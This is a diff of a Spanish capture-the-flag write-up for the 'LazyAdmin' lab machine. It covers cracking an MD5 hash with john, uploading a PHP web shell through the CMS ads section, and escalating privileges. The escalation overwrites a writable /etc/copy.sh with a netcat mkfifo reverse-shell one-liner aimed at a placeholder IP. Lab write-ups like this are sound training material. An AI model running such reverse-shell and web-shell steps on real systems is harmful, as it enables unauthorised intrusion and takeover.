@@ -121,11 +121,24 @@ init $1
 > john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 <img src="/imgs/lazyAdmin/lazyAdmin8.jpg"/>
 <br><br>
-<p>contraseña mas debil jejeje</p>
-<p>Ahora ya podemo ingresar al login de la pagina web</p>
+<p>contraseña mas debil jejeje.</p>
+<p>Ahora ya podemo ingresar al login de la pagina web.</p>
 <img src="/imgs/lazyAdmin/lazyAdmin9.jpg"/>
-<p>Ahora nos vamos al apartado de anuncios </p>
+<p>Ahora nos vamos al apartado de anuncios.</p>
 <img src="/imgs/lazyAdmin/lazyAdmin10.jpg"/>
-<p>Ahora solo colocamos un codigo php que me de una web shell en este caso coloco : </p>
+<p>Ahora solo colocamos un codigo php que me de una web shell. </p>
+<img src="/imgs/lazyAdmin/lazyAdmin11.jpg"/>
+* <p>Ahora vamos a la url, donde se cargo el archivo php en este caso es en  <font color="yellow">http://localhost/content/inc/ads/( nombre de archivo).php</font></p>
+<img src="/imgs/lazyAdmin/lazyAdmin12.jpg"/>
+* <p>Nos ponemos en escucha en nuestra terminal y recargamos la pagina web anterior, de esta forma ganaremos una web shell</p>
+<img src="/imgs/lazyAdmin/lazyAdmin13.jpg"/>
+* <p>Enumeramos el sistema para ver como podemos escalar privilegios.</p>
+<img src="/imgs/lazyAdmin/lazyAdmin14.jpg"/>
+<br><br>
+`En la imagen podemos ver que tenemos permisos para ejecutar perl, un archivo llamado /home/itguy/backuo.pl que a su vez ejecuta otro archivo llamado /etc/copy.sh el cual vemos que tenemos permisos de escritura`
+* Como el archivo /etc/copy.sh, en su contexto vemos que el archivo tiene una estructura para lanzar una seudo consola por una ip y un puerto, lo que hare sera remplzar la ip y el puerto y ejecutar el archivo.
+> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TuIp 5555 >/tmp/f"  > /etc/copy.sh
+<img src="/imgs/lazyAdmin/lazyAdmin15.jpg"/>
+<p>OK maquina vulnerada.</p>
 
 
